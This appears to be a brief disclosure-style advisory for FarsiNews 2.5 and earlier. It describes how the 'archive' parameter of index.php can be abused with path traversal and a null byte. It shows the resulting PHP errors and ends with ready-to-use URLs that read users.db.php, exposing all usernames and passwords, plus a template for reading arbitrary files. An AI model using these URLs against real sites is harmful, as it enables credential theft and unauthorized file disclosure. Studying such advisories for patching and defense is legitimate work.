Vulnerable Systems:
    FarsiNews 2.5 and below (also tested on 2.1)

in FarsiNews if you change the archive value :
http://localhost/index.php?archive=hamid
----------------------------[<error>]---------------------------
Warning:
file([PATH]/data/archives/hamid.news.arch.php): 
failed to open stream: No such file or directory in
[PATH]\inc\shows.inc.php on line 642

failed to open stream: No such file or directory in
[PATH]\inc\shows.inc.php on line 686
...[and many other error]
----------------------------[</error>]---------------------------

it means that shows.inc.php  try to open 
'/archives/hamid.news.arch.php'  (and also
'hamid.comments.arch.php')  to read it's data .
we can change the archive value to
'/../users.db.php%00' to see all username and password

http://localhost/index.php?archive=/../users.db.php%00
http://localhost/Farsi1/index.php?archive=/../[file-to-read]%00
